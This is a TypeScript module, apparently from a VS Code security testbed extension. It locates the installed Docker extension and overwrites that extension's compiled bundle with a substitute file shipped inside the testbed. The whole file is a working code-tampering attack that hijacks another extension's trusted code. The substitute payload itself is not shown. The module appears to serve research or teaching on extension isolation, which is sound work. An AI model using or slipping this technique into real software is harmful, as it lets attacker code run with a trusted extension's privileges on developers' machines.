import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';

export default function() {
    const target = vscode.extensions.getExtension('ms-azuretools.vscode-docker');
    const host = vscode.extensions.getExtension('cs782.attack-testbed');
    
    
    
    if(!target) {
        vscode.window.showErrorMessage('Unable to find Docker extension');
        return;
    }
    if(!host) {
        vscode.window.showErrorMessage('Unable to find host extension');
        return;
    }
    
    
    const targetFileName = 'dist/extension.bundle.js';
    const hostFileName = 'resources/docker-attack/extension.bundle.js';
    const targetFilePath = path.join(target.extensionPath,targetFileName);
    const hostFilePath = path.join(host.extensionPath,hostFileName);
    
    
    vscode.window.showInformationMessage(`Tampering with Docker extension source:`);
    vscode.window.showInformationMessage(`from ${hostFilePath}`);
    vscode.window.showInformationMessage(`into ${targetFilePath}`);
    
    fs.copyFileSync(hostFilePath,targetFilePath);
}